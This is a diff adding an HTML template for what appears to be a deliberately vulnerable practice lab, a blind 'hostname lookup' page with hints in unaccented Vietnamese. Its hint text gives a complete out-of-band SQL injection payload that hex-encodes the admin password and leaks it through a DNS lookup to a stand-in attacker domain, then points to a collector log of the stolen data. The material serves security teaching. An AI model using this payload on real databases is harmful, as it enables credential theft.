@@ -1,0 +1,16 @@
+{% extends "base.html" %}
+{% block body %}
+<h2>Hostname lookup <span class="tag">out-of-band</span></h2>
+<form method="get" action="/lookup">
+  <label>host: <input name="host" size="50" value="{{ host or '' }}"></label>
+  <button>Tra cuu</button>
+</form>
+{% if done %}
+  <p>Da xu ly <code>{{ host }}</code>. (Response luon giong nhau, khong lo du lieu,
+  khong loi, khong tre — blind hoan toan.)</p>
+{% endif %}
+<p><small>Kenh duy nhat de rut du lieu la <b>out-of-band</b>: ep CSDL goi ra
+  <code>{{ collector }}</code>. Thu:<br>
+  <code>x' UNION SELECT dns_lookup(hex((SELECT password FROM users WHERE username='admin'))||'.exfil.attacker.lab')-- </code><br>
+  roi mo <a href="{{ collector }}/log" target="_blank">{{ collector }}/log</a> de xem du lieu danh cap.</small></p>
+{% endblock %}
